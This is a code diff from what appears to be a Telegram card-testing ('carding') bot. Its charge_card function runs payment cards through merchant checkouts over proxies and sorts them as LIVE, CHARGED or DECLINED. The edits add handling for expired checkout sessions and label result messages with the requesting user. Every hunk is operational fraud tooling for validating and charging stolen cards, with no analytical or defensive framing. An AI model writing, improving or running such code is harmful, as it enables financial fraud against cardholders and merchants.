@@ -885,8 +885,11 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                     msg = err.get("message", "Failed")
                     err_code = err.get("code", "")
                     
+                    # Check if session is expired/inactive
+                    if err_code == 'checkout_not_active_session' or 'no longer active' in msg.lower():
+                        result["status"] = "SESSION_EXPIRED"
                     # Check if decline code indicates card is LIVE
-                    if dc in LIVE_DECLINE_CODES:
+                    elif dc in LIVE_DECLINE_CODES:
                         result["status"] = "LIVE"
                     else:
                         result["status"] = "DECLINED"
@@ -1466,6 +1469,8 @@ async def co_handler(msg: Message):
         if result['status'] == 'CHARGED':
             charged_card = result
             break
+        if result['status'] == 'SESSION_EXPIRED':
+            break
     
     total_time = round(time.perf_counter() - start_time, 2)
     
@@ -1514,8 +1519,11 @@ async def co_handler(msg: Message):
         response += f"😡 𝟯𝗗𝗦: {three_ds_count}\n"
     if error_count > 0:
         response += f"💀 𝗘𝗿𝗿𝗼𝗿𝘀: {error_count}\n"
-    response += f"💸 𝗧𝗼𝘁𝗮𝗹: {len(results)}/{len(cards)}\n"
-    response += f"⏱ 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲: {format_time(total_time)}</blockquote>"
+    response += f"🧮 𝗧𝗼𝘁𝗮𝗹: {len(results)}/{len(cards)}\n"
+    response += f"⏱ 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲: {format_time(total_time)}\n"
+    req_name = msg.from_user.full_name or msg.from_user.username or 'Unknown'
+    req_user = f"@{msg.from_user.username}" if msg.from_user.username else req_name
+    response += f"\nMᴇssᴀɢᴇ Bʸ: {req_user}</blockquote>"
     
     # Add success URL if card was charged
     if charged_card and checkout_data.get('success_url'):
